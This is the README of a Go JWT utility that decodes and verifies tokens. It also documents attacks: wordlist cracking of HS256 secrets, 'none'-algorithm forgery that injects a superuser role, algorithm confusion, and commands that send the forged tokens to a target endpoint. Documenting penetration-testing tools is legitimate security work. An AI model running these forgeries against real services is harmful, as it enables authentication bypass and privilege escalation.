# JWT Tool

A small Go utility for working with JWT tokens — decode, verify, generate and perform several attack techniques (brute-force secret cracking, "none" algorithm, algorithm confusion).

This repository is intended for educational and research purposes only. Use responsibly and only against systems you are authorized to test.

## Features

- Decode: inspect JWT header, payload and signature
- Verify: validate HS256 signature with a provided secret
- Crack: concurrent brute-force of HS256 secret from a wordlist (shows a progress bar)
- None: create a token with `alg: none` and an arbitrary payload
- Confusion: algorithm confusion (generate an HS256 token using bytes from a provided public key file as the HMAC secret)
- Online checks: commands to send tokens to a target endpoint (with optional proxy and TLS insecure flag)

## Requirements

- Go 1.20+

## Build

```bash
git clone https://github.com/ChesstorOtter/jwttool.git
cd jwttool
go mod download
go build -o jwttool.exe
```

## Usage (CLI)

General patterns:

- decode: jwttool decode "<token>"
- verify: jwttool verify "<token>" "<secret>"
- crack: jwttool crack "<token>" <wordlist>
- none: jwttool none "<token>" '<json-payload>'
- confusion: jwttool confusion "<token>" '<json-payload>' <publicKeyPath>
- attack-none: jwttool attack-none "<token>" <target> <endpoint> [proxy] [insecure:true|false]
- attack-crack: jwttool attack-crack "<token>" <wordlist> <target> <endpoint> [proxy] [insecure:true|false]

Notes:
- For JSON payload arguments, wrap the JSON in single quotes on shells that support it.
- attack-* commands will send the token to target+endpoint (GET) and support optional proxy and insecure TLS.

## Examples

Decode a token:
```bash
go run main.go decode "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
```

Verify a token with a secret:
```bash
go run main.go verify "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." "secret"
```

Crack HS256 secret from a wordlist (concurrent, progress bar):
```bash
go run main.go crack "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." wordlist.txt
```
Expected output includes a progress bar and the discovered secret:
```
Starting token cracking...
100% |███████████████████████████████████████████| (80/80, 147874 it/s)
Token is valid with secret: "secret"
```

None attack — change algorithm to `none` and inject/merge payload:
```bash
go run main.go none "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." '{"role":"superuser"}'
```
Output:
```
New token with 'none' algorithm:
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoic3VwZXJ1c2VyIn0.
New Payload:
{
  "role": "superuser",
  ...
}
```
(The payload printed is the merged payload — existing fields are preserved and new fields are merged in.)

Confusion attack — generate HS256 token by using the provided public key file bytes as the HMAC secret:
```bash
go run main.go confusion "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." '{"role":"superuser"}' public_key.pem
```
Output:
```
New token with 'HS256' algorithm (signed using provided public key bytes):
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoic3VwZXJ1c2VyIn0.SIGNATURE_BASE64
```

Online check examples

- Test "none" attack remotely:
```bash
go run main.go attack-none "<token>" https://example.com /api/protected "" false
```

- Crack + test online (wordlist required):
```bash
go run main.go attack-crack "<token>" wordlist.txt https://example.com /api/protected "" false
```
When cracking, the tool finds the secret, re-signs the token using HS256 and the discovered secret, then sends the re-signed token to the target endpoint.

## Project structure
```
jwttool/
├── main.go
├── generate.go
├── cmd/
│   ├── crack.go
│   ├── decode.go
│   ├── verify.go
│   ├── none.go
│   └── confusion.go
├── pkg/jwt/
│   ├── parser.go
│   ├── signer.go
│   ├── craker.go
│   ├── none.go
│   └── confusion.go
├── pkg/http/
│   └── client.go
├── go.mod
├── go.sum
└── README.md
```

## Notes / Security

- The tool performs cryptographic operations and network requests. Be careful with handling keys and tokens.
- Confusion attack intentionally treats a public key file's raw bytes as an HMAC secret to demonstrate algorithm confusion vulnerabilities — this is intentionally insecure and for demonstration/testing only.
